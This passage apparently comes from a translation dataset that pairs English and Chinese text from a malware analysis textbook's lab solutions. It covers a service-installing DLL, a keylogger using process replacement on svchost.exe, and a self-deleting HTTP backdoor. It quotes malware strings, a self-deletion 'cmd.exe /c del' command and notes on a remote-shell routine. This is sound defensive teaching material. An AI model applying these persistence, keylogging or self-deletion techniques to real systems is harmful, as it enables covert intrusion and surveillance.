  id: totrans-911
  prefs: []
  type: TYPE_NORMAL
  zh: 'HKLM\SYSTEM\CurrentControlSet\Services\IPRIP\DisplayName:'
- en: '"Intranet Network Awareness (INA+)" '
  id: totrans-912
  prefs: []
  type: TYPE_NORMAL
  zh: '"内部网络网络意识 (INA+)" '
- en: 'HKLM\SYSTEM\CurrentControlSet\Services\IPRIP\Description:'
  id: totrans-913
  prefs: []
  type: TYPE_NORMAL
  zh: 'HKLM\SYSTEM\CurrentControlSet\Services\IPRIP\Description:'
- en: '"Depends INA+, Collects and stores network configuration and location information,
    and notifies applications when this information changes." '
  id: totrans-914
  prefs: []
  type: TYPE_NORMAL
  zh: '"依赖 INA+，收集和存储网络配置和位置信息，并在此信息更改时通知应用程序。" '
- en: The Keys added section shows that the malware installed itself as the service
    IPRIP at . Since the malware is a DLL, it depends on an executable to launch
    it. In fact, we see at  that the ImagePath is set to svchost.exe, which means
    that the malware will be launched inside an *svchost.exe* process. The rest of
    the information, such as the DisplayName and Description at  and , creates a
    unique fingerprint that can be used to identify the malicious service.
  id: totrans-915
  prefs: []
  type: TYPE_NORMAL
  zh: 添加的密钥部分显示，恶意软件已将自己安装为 IPRIP 服务。由于恶意软件是一个 DLL，它依赖于可执行文件来启动它。实际上，我们在处看到 ImagePath
    被设置为 svchost.exe，这意味着恶意软件将在 *svchost.exe* 进程内部启动。其余的信息，如和处的 DisplayName 和 Description，创建了一个独特的指纹，可以用来识别恶意服务。
- en: If we examine the strings closely, we see SOFTWARE\Microsoft\Windows NT\ CurrentVersion\SvcHost
    and a message "You specify service name not in Svchost//
  id: totrans-916
  prefs: []
  type: TYPE_NORMAL
  zh: 如果我们仔细检查字符串，我们会看到SOFTWARE\Microsoft\Windows NT\ CurrentVersion\SvcHost和一个消息“您指定的服务名称不在
    Svchost//”。
- en: netsvcs, must be one of following". If we follow our hunch and examine the
  id: totrans-917
  prefs: []
  type: TYPE_NORMAL
  zh: netsvcs，必须是以下之一。如果我们跟随我们的直觉并检查
- en: \SvcHost\netsvcs registry key, we can see other potential service names we might
    use, like 6to4 AppMgmt. Running Lab03-02.dll,installA 6to4 will install this malware
    under the 6to4 service instead of the IPRIP service, as in the previous listing.
  id: totrans-918
  prefs: []
  type: TYPE_NORMAL
  zh: 在 \SvcHost\netsvcs 注册表键中，我们可以看到我们可能使用的其他潜在服务名称，例如 6to4 AppMgmt。运行 Lab03-02.dll，安装
    6to4 将在 6to4 服务而不是 IPRIP 服务下安装此恶意软件，如前所述。
- en: After installing the malware as a service, we could launch it, but first we’ll
    set up the rest of our basic dynamic tools. We run procmon (after clearing out
    all events); start Process Explorer; and set up a virtual network, including ApateDNS
    and Netcat listening on port 80 (since we see HTTP in the strings listing).
  id: totrans-919
  prefs: []
  type: TYPE_NORMAL
  zh: 在将恶意软件作为服务安装后，我们可以启动它，但首先我们将设置其余的基本动态工具。我们运行 procmon（在清除所有事件后）；启动进程资源管理器；并设置一个虚拟网络，包括
    ApateDNS 和 Netcat 监听端口 80（因为我们看到字符串列表中有 HTTP）。
- en: 'Since this malware is installed as the IPRIP service, we can start it using
    the net command in Windows, as follows:'
  id: totrans-920
  prefs: []
  type: TYPE_NORMAL
  zh: 由于此恶意软件作为 IPRIP 服务安装，我们可以使用 Windows 中的 net 命令启动它，如下所示：
- en: c:\> **net start IPRIP**
  id: totrans-921
  prefs: []
  type: TYPE_NORMAL
  zh: c:\> **net start IPRIP**
- en: The Intranet Network Awareness (INA+) service is starting.
  id: totrans-922
  prefs: []
  type: TYPE_NORMAL
  zh: 内部网络网络意识（INA+）服务即将启动。
- en: The Intranet Network Awareness (INA+) service was started successfully.
  id: totrans-923
  prefs: []
  type: TYPE_NORMAL
  zh: 内部网络网络意识（INA+）服务启动成功。
- en: '**488**'
  id: totrans-924
  prefs: []
  type: TYPE_NORMAL
  zh: '**488**'
- en: Appendix C
  id: totrans-925
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-926
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 99](index-522_1.png)'
  id: totrans-927
  prefs: []
  type: TYPE_IMG
  zh: '![Image 99](index-522_1.png)'
- en: '![Image 100](index-522_2.png)'
  id: totrans-928
  prefs: []
  type: TYPE_IMG
  zh: '![Image 100](index-522_2.png)'
- en: The fact that the display name (INA+) matches the information found in the registry
    tells us that our malicious service has started.
  id: totrans-929
  prefs: []
  type: TYPE_NORMAL
  zh: 显示名称（INA+）与注册表中找到的信息相匹配的事实告诉我们，我们的恶意服务已启动。
- en: Next, we open Process Explorer and attempt to find the process in which the
    malware is running by selecting **Find****Find Handle or DLL** to open the **3**
  id: totrans-930
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们打开进程资源管理器，通过选择**查找****查找句柄或 DLL**来打开**3**，尝试找到恶意软件正在运行的进程。
- en: 'dialog shown in Figure 3-6L. We enter **Lab03-02.dll** and click **Search**.
    As shown in the figure, the result tells us that *Lab03-02.dll* is loaded by *svchost.exe*
    with the PID 1024\. (The specific PID may differ on your system.) *Figure 3-6L:
    Searching for a DLL in Process Explorer* In Process Explorer, we select **View****Lower
    Pane View****DLLs** and choose the *svchost.exe* running with PID 1024\. Figure
    3-7L shows the result.'
  id: totrans-931
  prefs: []
  type: TYPE_NORMAL
  zh: 如图3-6L所示，我们进入**Lab03-02.dll**并点击**搜索**。如图所示，结果显示*Lab03-02.dll*是由*svchost.exe*加载的，其进程ID为1024。（具体的PID可能因系统而异。）*图3-6L：在进程资源管理器中搜索DLL*
    在进程资源管理器中，我们选择**视图****下窗格视图****DLLs**，并选择运行进程ID为1024的*svchost.exe*。图3-7L显示了结果。
- en: The display name Intranet Network Awareness (INA+) shown at  confirms that
    the malware is running in *svchost.exe*, which is further confirmed when we see
    at  that *Lab03-02.dll* is loaded.
  id: totrans-932
  prefs: []
  type: TYPE_NORMAL
  zh: 显示名称Intranet Network Awareness (INA+)确认恶意软件正在*svchost.exe*中运行，这在我们看到时得到进一步确认，即*Lab03-02.dll*被加载。
- en: '*Figure 3-7L: Examining service malware in Process Explorer* Next, we turn
    our attention to our network analysis tools. First, we check ApateDNS to see if
    the malware performed any DNS requests. The output shows a request for *practicalmalwareanalysis.com*,
    which matches the strings listing shown earlier.'
  id: totrans-933
  prefs: []
  type: TYPE_NORMAL
  zh: '*图3-7L：在进程资源管理器中检查服务恶意软件* 接下来，我们将注意力转向我们的网络分析工具。首先，我们检查ApateDNS以查看恶意软件是否执行了任何DNS请求。输出显示了一个对*practicalmalwareanalysis.com*的请求，这与之前显示的字符串列表相匹配。'
- en: '**NOTE**'
  id: totrans-934
  prefs: []
  type: TYPE_NORMAL
  zh: '**注意**'
- en: '*It takes 60 seconds after starting the service to see any network traffic
    (the program does* *a Sleep(60000) before attempting network access). If the networking
    connection fails for* *any reason (for example, you forgot to set up ApateDNS),
    it waits 10 minutes before* *attempting to connect again.*'
  id: totrans-935
  prefs: []
  type: TYPE_NORMAL
  zh: '*启动服务后需要60秒才能看到任何网络流量（程序在尝试网络访问之前会执行Sleep(60000)）。如果由于任何原因（例如，您忘记设置ApateDNS），它将在尝试再次连接之前等待10分钟。*'
- en: Solutions to Labs
  id: totrans-936
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**489**'
  id: totrans-937
  prefs: []
  type: TYPE_NORMAL
  zh: '**489**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-938
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 'We complete our network analysis by examining the Netcat results, as follows:'
  id: totrans-939
  prefs: []
  type: TYPE_NORMAL
  zh: 我们通过检查Netcat结果来完成我们的网络分析，如下所示：
- en: c:\> **nc -l -p 80**
  id: totrans-940
  prefs: []
  type: TYPE_NORMAL
  zh: c:\> **nc -l -p 80**
- en: '**GET** /serve.html HTTP/1.1'
  id: totrans-941
  prefs: []
  type: TYPE_NORMAL
  zh: '**GET** /serve.html HTTP/1.1'
- en: 'Accept: */*'
  id: totrans-942
  prefs: []
  type: TYPE_NORMAL
  zh: 'Accept: */*'
- en: 'User-Agent: **MalwareAnalysis2** Windows XP 6.11'
  id: totrans-943
  prefs: []
  type: TYPE_NORMAL
  zh: 'User-Agent: **MalwareAnalysis2** Windows XP 6.11'
- en: 'Host: practicalmalwareanalysis.com'
  id: totrans-944
  prefs: []
  type: TYPE_NORMAL
  zh: 主机：practicalmalwareanalysis.com
- en: We see that the malware performs an HTTP GET request over port 80 (we were listening
    over port 80 with Netcat since we saw HTTP in the string listing). We run this
    test several times, and the data appears to be consistent across runs.
  id: totrans-945
  prefs: []
  type: TYPE_NORMAL
  zh: 我们看到恶意软件通过端口80执行HTTP GET请求（我们自看到字符串列表中的HTTP以来一直在端口80上监听）。我们多次运行此测试，数据似乎在运行之间是一致的。
- en: We can create a couple of network signatures from this data. Because the malware
    consistently does a GET request for *serve.html*, we can use that GET request
    as a network signature. The malware also uses the User-Agent MalwareAnalysis2
    Windows XP 6.11\. MalwareAnalysis2 is our malware analysis virtual machine’s name
    (so this portion of the User-Agent will be different on your machine). The second
    part of the User-Agent (Windows XP 6.11) is consistent and can be used as a network
    signature.
  id: totrans-946
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以从这些数据中创建几个网络签名。因为恶意软件始终对*serve.html*执行GET请求，所以我们可以使用这个GET请求作为网络签名。恶意软件还使用了User-Agent
    MalwareAnalysis2 Windows XP 6.11。MalwareAnalysis2是我们恶意软件分析虚拟机的名称（因此User-Agent的这一部分在您的机器上会有所不同）。User-Agent的第二部分（Windows
    XP 6.11）是一致的，可以用作网络签名。
- en: '**Lab 3-3 Solutions**'
  id: totrans-947
  prefs: []
  type: TYPE_NORMAL
  zh: '**实验室3-3解决方案**'
- en: '***Short Answers***'
  id: totrans-948
  prefs: []
  type: TYPE_NORMAL
  zh: '***简答题***'
- en: 1\.
  id: totrans-949
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: The malware performs process replacement on *svchost.exe*.
  id: totrans-950
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件在*svchost.exe*上执行进程替换。
- en: 2\.
  id: totrans-951
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: Comparing the disk image of *svchost.exe* with its memory image shows that they
    are not the same. The memory image has strings such as practicalmalwareanalysis.log
    and [ENTER], but the disk image has neither.
  id: totrans-952
  prefs: []
  type: TYPE_NORMAL
  zh: 将*svchost.exe*的磁盘映像与其内存映像进行比较，发现它们并不相同。内存映像中有practicalmalwareanalysis.log和[ENTER]等字符串，但磁盘映像中却没有。
- en: 3\.
  id: totrans-953
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: The malware creates the log file *practicalmalwareanalysis.log*.
  id: totrans-954
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件创建日志文件*practicalmalwareanalysis.log*。
- en: 4\.
  id: totrans-955
  prefs: []
  type: TYPE_NORMAL
  zh: '4.'
- en: The program performs process replacement on *svchost.exe* to launch a keylogger.
  id: totrans-956
  prefs: []
  type: TYPE_NORMAL
  zh: 程序通过在*svchost.exe*上执行进程替换来启动键盘记录器。
- en: '***Detailed Analysis***'
  id: totrans-957
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: For this lab, we begin by launching Process Explorer and procmon. When procmon
    starts, the events stream by quickly, so we use **File****Capture Events** to
    toggle event capture on and off. (It’s best to keep event capture off until all
    dynamic analysis programs are started and you’re ready to execute the program.)
    We use **Filter****Filter** to open the Filter dialog, and then ensure that only
    the default filters are enabled by clicking the **Reset** button.
  id: totrans-958
  prefs: []
  type: TYPE_NORMAL
  zh: 对于这个实验，我们首先启动进程资源管理器和procmon。当procmon启动时，事件流快速通过，所以我们使用**文件****捕获事件**来切换事件捕获的开和关。（最好在所有动态分析程序启动并准备好执行程序之前关闭事件捕获。）我们使用**过滤器****过滤器**来打开过滤器对话框，然后通过单击**重置**按钮确保仅启用默认过滤器。
- en: '*Lab03-03.exe* can be run from the command prompt or by double-clicking its
    icon. Once run, *Lab03-03.exe* should be visible inside Process Explorer.'
  id: totrans-959
  prefs: []
  type: TYPE_NORMAL
  zh: '*Lab03-03.exe*可以从命令提示符或通过双击其图标运行。一旦运行，*Lab03-03.exe*应该在进程资源管理器中可见。'
- en: Notice how it creates the subprocess *svchost.exe*, and then exits, but leaves
    the *svchost.exe* process running as an orphaned process, as shown in Figure 3-8L.
  id: totrans-960
  prefs: []
  type: TYPE_NORMAL
  zh: 注意它如何创建子进程*svchost.exe*，然后退出，但留下*svchost.exe*进程作为孤儿进程运行，如图3-8L所示。
- en: (An *orphaned process* has no parent process listed in the process tree structure.)
    The fact that *svchost.exe* is orphaned is highly unusual and highly suspicious.
  id: totrans-961
  prefs: []
  type: TYPE_NORMAL
  zh: （一个*孤儿进程*在进程树结构中没有列出父进程。）*svchost.exe*进程成为孤儿进程是非常不寻常且非常可疑的。
- en: '**490**'
  id: totrans-962
  prefs: []
  type: TYPE_NORMAL
  zh: '**490**'
- en: Appendix C
  id: totrans-963
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-964
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 101](index-524_1.png)'
  id: totrans-965
  prefs: []
  type: TYPE_IMG
  zh: '![Image 101](index-524_1.png)'
- en: '![Image 102](index-524_2.png)'
  id: totrans-966
  prefs: []
  type: TYPE_IMG
  zh: '![Image 102](index-524_2.png)'
- en: '*Figure 3-8L: Process Explorer view of orphaned* svchost.exe **3**'
  id: totrans-967
  prefs: []
  type: TYPE_NORMAL
  zh: '*图3-8L：孤儿* svchost.exe *的进程资源管理器视图3*'
- en: We investigate further by right-clicking and selecting **Properties** for the
    orphaned *svchost.exe* process. As shown in Figure 3-8L, the process appears to
    be a valid *svchost.exe* process with PID 388, but this *svchost.exe* is suspicious
    because *svchost.exe* is typically a child of *services.exe*.
  id: totrans-968
  prefs: []
  type: TYPE_NORMAL
  zh: 我们通过右键单击并选择孤儿*svchost.exe*进程的**属性**来进一步调查。如图3-8L所示，该进程看起来是一个有效的*svchost.exe*进程，PID为388，但这个*svchost.exe*进程是可疑的，因为*svchost.exe*通常是*services.exe*的子进程。
- en: From this same properties page, we select **Strings** to show the strings in
    both the executable image on disk and in memory. Toggling between the **Image**
    and **Memory** radio buttons shows significant discrepancies between the images.
    As shown in Figure 3-9L, the strings in memory on the right contain practicalmalwareanalysis.log
    and [ENTER], seen at  and , neither of which is found in a typical Windows *svchost.exe*
    file on disk, as seen on the left.
  id: totrans-969
  prefs: []
  type: TYPE_NORMAL
  zh: 从相同的属性页面，我们选择**字符串**来显示磁盘上的可执行映像和内存中的字符串。在**映像**和**内存**单选按钮之间切换显示图像之间的显著差异。如图3-9L所示，右侧内存中的字符串包含practicalmalwareanalysis.log和[ENTER]，分别位于和，这两个字符串都没有在典型的Windows
    *svchost.exe*文件中找到，如图左侧所示。
- en: '*Figure 3-9L: Process Explorer shows strings that are not normally contained
    in* svchost.exe *.*'
  id: totrans-970
  prefs: []
  type: TYPE_NORMAL
  zh: '*图3-9L：进程资源管理器显示* svchost.exe *中通常不包含的字符串*'
- en: The presence of the string practicalmalwareanalysis.log, coupled with strings
    like [ENTER] and [CAPS LOCK], suggests that this program is a keylogger.
  id: totrans-971
  prefs: []
  type: TYPE_NORMAL
  zh: 字符串practicalmalwareanalysis.log的存在，以及[ENTER]和[CAPS LOCK]等字符串，表明这个程序是一个键盘记录器。
- en: To test our assumption, we open Notepad and type a short message to see if the
    malware will perform keylogging. To do so, we use the PID (found in Process Explorer)
    for the orphaned *svchost.exe* to create a filter in procmon to show only events
    from that PID (388). As you can see in Figure 3-10L, the CreateFile and WriteFile
    events for *svchost.exe* are writing to the file named *practicalmalwareanalysis.log*.
    (This same string is visible in the memory view of the orphaned *svchost.exe*
    process.)
  id: totrans-972
  prefs: []
  type: TYPE_NORMAL
  zh: 为了测试我们的假设，我们打开记事本并输入一条简短的消息，以查看恶意软件是否会执行键盘记录。为此，我们使用进程资源管理器中找到的孤儿*svchost.exe*的PID（388）在procmon中创建一个过滤器，以仅显示来自该PID的事件。如图3-10L所示，*svchost.exe*的CreateFile和WriteFile事件正在写入名为*practicalmalwareanalysis.log*的文件。（相同的字符串在孤儿*svchost.exe*进程的内存视图中可见。）
- en: Solutions to Labs
  id: totrans-973
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解决方案
- en: '**491**'
  id: totrans-974
  prefs: []
  type: TYPE_NORMAL
  zh: '**491**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-975
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 103](index-525_1.png)'
  id: totrans-976
  prefs: []
  type: TYPE_IMG
  zh: '![Image 103](index-525_1.png)'
- en: '*Figure 3-10L: Procmon output of svchost.exe with PID 388*'
  id: totrans-977
  prefs: []
  type: TYPE_NORMAL
  zh: '*图3-10L：svchost.exe（PID 388）的Procmon输出*'
- en: Opening *practicalmalwareanalysis.log* with a simple text editor reveals the
    keystrokes you entered in Notepad. We conclude that this malware is a keylogger
    that uses process replacement on *svchost.exe*.
  id: totrans-978
  prefs: []
  type: TYPE_NORMAL
  zh: 使用简单的文本编辑器打开 *practicalmalwareanalysis.log* 可以看到你在记事本中输入的按键。我们得出结论，这种恶意软件是一个使用
    *svchost.exe* 进程替换功能的关键记录器。
- en: '**Lab 3-4 Solutions**'
  id: totrans-979
  prefs: []
  type: TYPE_NORMAL
  zh: '**3-4实验室解决方案**'
- en: '***Short Answers***'
  id: totrans-980
  prefs: []
  type: TYPE_NORMAL
  zh: '***简短答案***'
- en: 1\.
  id: totrans-981
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: When you run this malware by double-clicking it, the program immediately deletes
    itself.
  id: totrans-982
  prefs: []
  type: TYPE_NORMAL
  zh: 当您通过双击运行此恶意软件时，程序会立即删除自己。
- en: 2\.
  id: totrans-983
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: We suspect that we may need to provide a command-line argument or a missing
    component to the program.
  id: totrans-984
  prefs: []
  type: TYPE_NORMAL
  zh: 我们怀疑我们可能需要向程序提供命令行参数或缺少的组件。
- en: 3\.
  id: totrans-985
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: We try using the command-line parameters shown in the strings listing (like
    -in), but doing so is not fruitful. More in-depth analysis is required.
  id: totrans-986
  prefs: []
  type: TYPE_NORMAL
  zh: 我们尝试使用字符串列表中显示的命令行参数（如 -in），但这样做并没有结果。需要更深入的分析。
- en: (We’ll analyze this malware further in the labs for Chapter 9.)
  id: totrans-987
  prefs: []
  type: TYPE_NORMAL
  zh: （我们将在第9章的实验室中进一步分析这种恶意软件。）
- en: '***Detailed Analysis***'
  id: totrans-988
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: We begin with basic static analysis, examining the PE file structure and strings.
    We see that this malware imports networking functionality, service-manipulation
    functions, and registry-manipulation functions. In the following listing, we notice
    a number of interesting strings.
  id: totrans-989
  prefs: []
  type: TYPE_NORMAL
  zh: 我们从基本的静态分析开始，检查PE文件结构和字符串。我们看到这种恶意软件导入了网络功能、服务操作函数和注册表操作函数。在下面的列表中，我们注意到一些有趣的字符串。
- en: SOFTWARE\Microsoft \XPS
  id: totrans-990
  prefs: []
  type: TYPE_NORMAL
  zh: 软件Microsoft \XPS
- en: \kernel32.dll
  id: totrans-991
  prefs: []
  type: TYPE_NORMAL
  zh: \kernel32.dll
- en: HTTP/1.0
  id: totrans-992
  prefs: []
  type: TYPE_NORMAL
  zh: HTTP/1.0
- en: GET
  id: totrans-993
  prefs: []
  type: TYPE_NORMAL
  zh: GET
- en: NOTHING
  id: totrans-994
  prefs: []
  type: TYPE_NORMAL
  zh: 什么都没有
- en: DOWNLOAD
  id: totrans-995
  prefs: []
  type: TYPE_NORMAL
  zh: 下载
- en: UPLOAD
  id: totrans-996
  prefs: []
  type: TYPE_NORMAL
  zh: 上传
- en: SLEEP
  id: totrans-997
  prefs: []
  type: TYPE_NORMAL
  zh: 睡眠
- en: cmd.exe
  id: totrans-998
  prefs: []
  type: TYPE_NORMAL
  zh: cmd.exe
- en: '>> NUL'
  id: totrans-999
  prefs: []
  type: TYPE_NORMAL
  zh: '>> 空白'
- en: /c del
  id: totrans-1000
  prefs: []
  type: TYPE_NORMAL
  zh: /c del
- en: http://www.practicalmalwareanalysis.com
  id: totrans-1001
  prefs: []
  type: TYPE_NORMAL
  zh: http://www.practicalmalwareanalysis.com
- en: '**492**'
  id: totrans-1002
  prefs: []
  type: TYPE_NORMAL
  zh: '**492**'
- en: Appendix C
  id: totrans-1003
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1004
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 104](index-526_1.png)'
  id: totrans-1005
  prefs: []
  type: TYPE_IMG
  zh: '![图像104](index-526_1.png)'
- en: NT AUTHORITY\LocalService
  id: totrans-1006
  prefs: []
  type: TYPE_NORMAL
  zh: NT AUTHORITY\LocalService
- en: Manager Service
  id: totrans-1007
  prefs: []
  type: TYPE_NORMAL
  zh: 管理服务
- en: .exe
  id: totrans-1008
  prefs: []
  type: TYPE_NORMAL
  zh: .exe
- en: '%SYSTEMROOT%\system32\'
  id: totrans-1009
  prefs: []
  type: TYPE_NORMAL
  zh: '%SYSTEMROOT%\system32\'
- en: k:%s h:%s p:%s per:%s
  id: totrans-1010
  prefs: []
  type: TYPE_NORMAL
  zh: k:%s h:%s p:%s per:%s
- en: '**3**'
  id: totrans-1011
  prefs: []
  type: TYPE_NORMAL
  zh: '**3**'
- en: -cc
  id: totrans-1012
  prefs: []
  type: TYPE_NORMAL
  zh: -cc
- en: -re
  id: totrans-1013
  prefs: []
  type: TYPE_NORMAL
  zh: -re
- en: -in
  id: totrans-1014
  prefs: []
  type: TYPE_NORMAL
  zh: -in
- en: We see strings such as a domain name and the registry location SOFTWARE\ Microsoft
    \XPS. Strings like DOWNLOAD and UPLOAD, combined with the HTTP/1.0
  id: totrans-1015
  prefs: []
  type: TYPE_NORMAL
  zh: 我们看到诸如域名和注册表位置软件Microsoft \XPS之类的字符串。下载和上传之类的字符串，结合HTTP/1.0
- en: string, suggest that this malware is an HTTP backdoor. The strings -cc, -re,
    and -in could be command-line parameters (for example -in may stand for install).
    Let’s see if basic dynamic techniques show us how these strings are used.
  id: totrans-1016
  prefs: []
  type: TYPE_NORMAL
  zh: 字符串，表明这种恶意软件是一个HTTP后门。字符串 -cc、-re 和 -in 可能是命令行参数（例如 -in 可能代表安装）。让我们看看基本的动态技术是否能够显示这些字符串是如何被使用的。
- en: Before we run the malware, we run procmon and clear out all events, start Process
    Explorer, and set up a virtual network. When we run the malware, it appears to
    immediately delete itself, and we see nothing else of interest while watching
    with Process Explorer.
  id: totrans-1017
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们运行恶意软件之前，我们运行procmon并清除所有事件，启动进程资源管理器，并设置虚拟网络。当我们运行恶意软件时，它似乎立即删除了自己，在进程资源管理器中观察时我们没有看到其他任何有趣的事情。
- en: Next, we use procmon with a filter on the process name *Lab03-04.exe*.
  id: totrans-1018
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们使用带有进程名称 *Lab03-04.exe* 过滤器的procmon。
- en: There aren’t any interesting WriteFile or RegSetValue entries, but upon further
    digging, we find an entry for Process Create. Double-clicking this entry brings
    up the dialog shown in Figure 3-11L, and we see that the malware is deleting itself
    from the system using "C:\WINDOWS\system32\cmd.exe" /c del Z:\ Lab03-04.exe >>
    NUL, as seen at .
  id: totrans-1019
  prefs: []
  type: TYPE_NORMAL
  zh: 没有任何有趣的WriteFile或RegSetValue条目，但在进一步挖掘后，我们发现了一个进程创建的条目。双击此条目会弹出图3-11L所示的对话框，我们看到恶意软件正在使用
    "C:\WINDOWS\system32\cmd.exe" /c del Z:\ Lab03-04.exe >> NUL 从系统中删除自己，如图所示。
- en: '*Figure 3-11L: Procmon view of the Process Create performed for self-deletion*
    We can try to run the malware from the command line using the command-line options
    we saw in the strings listing (-in, -re, and –cc), but all of them fail and result
    in the program deleting itself. There isn’t much more we can do with basic dynamic
    techniques at this point, until we dig deeper into the malware. (We will revisit
    this malware in the Chapter 9 labs.) Solutions to Labs'
  id: totrans-1020
  prefs: []
  type: TYPE_NORMAL
  zh: '*图3-11L：Procmon查看用于自我删除的进程创建* 我们可以尝试使用我们在字符串列表中看到的命令行选项（如 -in）来运行恶意软件，但所有这些尝试都失败了，并且程序会自我删除。在深入挖掘恶意软件之前，我们在这里使用基本的动态技术没有更多的事情可以做。（我们将在第9章的实验室中重新访问这种恶意软件。）实验室解决方案'
- en: '**493**'
  id: totrans-1021
  prefs: []
  type: TYPE_NORMAL
  zh: '**493**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1022
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**Lab 5-1 Solutions**'
  id: totrans-1023
  prefs: []
  type: TYPE_NORMAL
  zh: '**5-1实验室解决方案**'
- en: '***Short Answers***'
  id: totrans-1024
  prefs: []
  type: TYPE_NORMAL
  zh: '***简短答案***'
- en: 1\.
  id: totrans-1025
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: DllMain is found at 0x1000D02E in the .text section.
  id: totrans-1026
  prefs: []
  type: TYPE_NORMAL
  zh: DllMain位于.text部分的0x1000D02E。
- en: 2\.
  id: totrans-1027
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: The import for gethostbyname is found at 0x100163CC in the .idata section.
  id: totrans-1028
  prefs: []
  type: TYPE_NORMAL
  zh: gethostbyname 的导入信息位于 .idata 部分的 0x100163CC 处。
- en: 3\.
  id: totrans-1029
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: The gethostbyname import is called nine times by five different functions throughout
    the malware.
  id: totrans-1030
  prefs: []
  type: TYPE_NORMAL
  zh: 在恶意软件的五个不同函数中，gethostbyname 导入被调用了九次。
- en: 4\.
  id: totrans-1031
  prefs: []
  type: TYPE_NORMAL
  zh: '4.'
- en: A DNS request for pics.practicalmalwareanalysis.com will be made by the malware
    if the call to gethostbyname at 0x10001757 succeeds.
  id: totrans-1032
  prefs: []
  type: TYPE_NORMAL
  zh: 如果在 0x10001757 处对 gethostbyname 的调用成功，恶意软件将发起对 pics.practicalmalwareanalysis.com
    的 DNS 请求。
- en: 5\.
  id: totrans-1033
  prefs: []
  type: TYPE_NORMAL
  zh: '5.'
- en: IDA Pro has recognized 23 local variables for the function at 0x10001656\.
  id: totrans-1034
  prefs: []
  type: TYPE_NORMAL
  zh: IDA Pro 已经识别了位于 0x10001656 处函数的 23 个局部变量。
- en: 6\.
  id: totrans-1035
  prefs: []
  type: TYPE_NORMAL
  zh: '6.'
- en: IDA Pro has recognized one parameter for the function at 0x10001656\.
  id: totrans-1036
  prefs: []
  type: TYPE_NORMAL
  zh: IDA Pro 已经识别了位于 0x10001656 处函数的一个参数。
- en: 7\.
  id: totrans-1037
  prefs: []
  type: TYPE_NORMAL
  zh: '7.'
- en: The string \cmd.exe /c is located at 0x10095B34\.
  id: totrans-1038
  prefs: []
  type: TYPE_NORMAL
  zh: 字符串 \cmd.exe /c 位于 0x10095B34 处。
- en: 8\.
  id: totrans-1039
  prefs: []
  type: TYPE_NORMAL
  zh: '8.'
- en: That area of code appears to be creating a remote shell session for the attacker.
  id: totrans-1040
  prefs: []
  type: TYPE_NORMAL
  zh: 那段代码看起来是在为攻击者创建一个远程 shell 会话。
- en: 9\.
  id: totrans-1041
  prefs: []
  type: TYPE_NORMAL
  zh: '9.'
- en: The OS version is stored in the global variable dword_1008E5C4\.
  id: totrans-1042
  prefs: []
  type: TYPE_NORMAL
  zh: 操作系统版本存储在全局变量 dword_1008E5C4 中。
- en: 10\. The registry values located at HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\
    WorkTime and WorkTimes are queried and sent over the remote shell connection.
  id: totrans-1043
  prefs: []
  type: TYPE_NORMAL
  zh: 10. 查询并通过远程 shell 连接发送位于 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ WorkTime
    和 WorkTimes 的注册表值。
- en: 11\. The PSLIST export sends a process listing across the network or finds a
    particular process name in the listing and gets information about it.
  id: totrans-1044
  prefs: []
  type: TYPE_NORMAL
  zh: 11. PSLIST 导出会将进程列表通过网络发送或找到列表中的特定进程名称，并获取其信息。
- en: 12\. GetSystemDefaultLangID, send, and sprintf are API calls made from sub_10004E79\.
    This function could be renamed to something useful like GetSystemLanguage.
  id: totrans-1045
  prefs: []
  type: TYPE_NORMAL
  zh: 12. GetSystemDefaultLangID、send 和 sprintf 是从 sub_10004E79 调用的 API 调用。这个函数可以被重命名为更有用的名称，如
    GetSystemLanguage。
- en: 13\. DllMain calls strncpy, strnicmp, CreateThread, and strlen directly. At
    a depth of 2, it calls a variety of API calls, including Sleep, WinExec, gethostbyname,
    and many other networking function calls.
  id: totrans-1046
  prefs: []
  type: TYPE_NORMAL
  zh: 13. DllMain 直接调用 strncpy、strnicmp、CreateThread 和 strlen。在深度为 2 时，它调用各种 API 调用，包括
